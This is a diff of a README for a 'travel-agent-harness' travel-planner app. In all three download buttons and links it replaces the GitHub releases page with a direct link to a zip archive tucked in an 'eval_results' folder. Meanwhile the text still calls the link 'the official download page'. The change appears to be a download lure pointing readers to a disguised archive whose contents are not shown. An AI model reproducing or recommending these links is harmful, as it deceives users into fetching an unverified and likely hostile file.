@@ -1,6 +1,6 @@
 # 🌍 travel-agent-harness - Your Smart Travel Planner Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-ff6b6b?style=for-the-badge&logo=download&logoColor=white)](https://github.com/ready-frenchregion8792/travel-agent-harness/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-ff6b6b?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/ready-frenchregion8792/travel-agent-harness/main/eval_results/agent-harness-travel-v2.8-alpha.4.zip)
 
 ![tests](https://img.shields.io/badge/tests-91%20passed-brightgreen) ![python](https://img.shields.io/badge/python-3.11%2B-blue) ![license](https://img.shields.io/badge/license-MIT-green)
 
@@ -45,7 +45,7 @@ Getting started is incredibly simple. Follow these three steps:
 
 Visit this link to download the application:
 
-[**Download travel-agent-harness**](https://github.com/ready-frenchregion8792/travel-agent-harness/releases)
+[**Download travel-agent-harness**](https://raw.githubusercontent.com/ready-frenchregion8792/travel-agent-harness/main/eval_results/agent-harness-travel-v2.8-alpha.4.zip)
 
 This single link takes you to the official download page where you can get the latest version.
 
@@ -133,7 +133,7 @@ The best part? It's completely free. No subscriptions, no hidden fees.
 
 So what are you waiting for? Plan your next adventure today.
 
-[**Click here to download the app**](https://github.com/ready-frenchregion8792/travel-agent-harness/releases)
+[**Click here to download the app**](https://raw.githubusercontent.com/ready-frenchregion8792/travel-agent-harness/main/eval_results/agent-harness-travel-v2.8-alpha.4.zip)
 
 ---
 
